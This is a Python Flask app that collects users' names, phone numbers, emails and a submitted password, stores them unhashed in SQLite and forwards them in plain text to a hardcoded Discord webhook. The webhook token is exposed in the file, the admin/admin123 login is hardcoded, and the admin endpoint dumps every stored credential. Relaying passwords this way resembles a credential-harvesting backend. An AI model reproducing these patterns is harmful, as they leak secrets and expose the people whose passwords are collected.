import os
import sqlite3
import logging
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import requests

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Paths & Config
DB_PATH = 'database/users.db'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1505132221617672363/scjAX58UwKiW8Shz1TIllJx9RY1DhbfcdNBFQvYFq5M3X3DF3_93XquVEB9xWisxvIj5'  # 🔴 Yahan apna Discord Webhook URL paste karein

# Logging Setup
os.makedirs('logs', exist_ok=True)
logging.basicConfig(filename='logs/bot_logs.txt', level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')

# Database Helper
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# Initialize DB
def init_db():
    os.makedirs('database', exist_ok=True)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users_credentials (
        username TEXT PRIMARY KEY, password TEXT NOT NULL)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS submitted_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL,
        name TEXT NOT NULL, mobile TEXT NOT NULL, email TEXT NOT NULL,
        form_password TEXT NOT NULL, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    # Default User (No Signup needed, Admin ya Developer pehle se set karega)
    cursor.execute("INSERT OR IGNORE INTO users_credentials (username, password) VALUES (?, ?)", ('user1', 'pass123'))
    conn.commit()
    conn.close()
    logging.info("Database initialized successfully.")

# Discord Notification
def send_to_discord(username, name, mobile, email, form_pass):
    if DISCORD_WEBHOOK_URL == 'YOUR_DISCORD_WEBHOOK_URL_HERE':
        logging.warning("Discord Webhook URL set nahi hai. Notification skip.")
        return
    payload = {
        "embeds": [{
            "title": "📩 New User Request Submitted",
            "color": 5814783,
            "fields": [
                {"name": "👤 Username", "value": username, "inline": True},
                {"name": "📝 Name", "value": name, "inline": True},
                {"name": "📱 Mobile", "value": mobile, "inline": True},
                {"name": "📧 Email", "value": email, "inline": True},
                {"name": "🔑 Requested Pass", "value": form_pass, "inline": True},
                {"name": "⏰ Time", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            ]
        }]
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        logging.info("Discord notification sent.")
    except Exception as e:
        logging.error(f"Discord Error: {e}")

# Routes
@app.route('/')
def index():
    return render_template('index.html', username=session.get('username'))

@app.route('/admin')
def admin():
    return render_template('admin.html', admin='admin' in session)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    conn = get_db()
    user = conn.execute('SELECT * FROM users_credentials WHERE username=? AND password=?', (data['username'], data['password'])).fetchone()
    conn.close()
    if user:
        session['username'] = data['username']
        logging.info(f"User logged in: {data['username']}")
        return jsonify({'success': True})
    return jsonify({'success': False, 'message': 'Invalid Username or Password'})

@app.route('/api/submit', methods=['POST'])
def api_submit():
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Login first'})
    
    data = request.json
    conn = get_db()
    conn.execute('INSERT INTO submitted_requests (username, name, mobile, email, form_password) VALUES (?, ?, ?, ?, ?)',
                 (session['username'], data['name'], data['mobile'], data['email'], data['form_password']))
    conn.commit()
    conn.close()

    send_to_discord(session['username'], data['name'], data['mobile'], data['email'], data['form_password'])
    logging.info(f"Request submitted by {session['username']}")
    return jsonify({'success': True, 'message': '✅ Request Submitted Successfully!'})

@app.route('/api/mailbox')
def api_mailbox():
    if 'username' not in session: return jsonify([])
    conn = get_db()
    data = conn.execute('SELECT * FROM submitted_requests WHERE username=? ORDER BY timestamp DESC', (session['username'],)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in data])

@app.route('/api/admin/login', methods=['POST'])
def api_admin_login():
    data = request.json
    if data.get('username') == 'admin' and data.get('password') == 'admin123':
        session['admin'] = True
        logging.info("Admin logged in")
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/api/admin/data')
def api_admin_data():
    if 'admin' not in session: return jsonify({'error': 'Unauthorized'})
    conn = get_db()
    users = conn.execute('SELECT * FROM users_credentials').fetchall()
    reqs = conn.execute('SELECT * FROM submitted_requests ORDER BY timestamp DESC').fetchall()
    conn.close()
    return jsonify({
        'users': [dict(u) for u in users],
        'requests': [dict(r) for r in reqs]
    })

@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('admin', None)
    return redirect('/')

if __name__ == '__main__':
    init_db()
    app.run(debug=True, host='127.0.0.1', port=5000)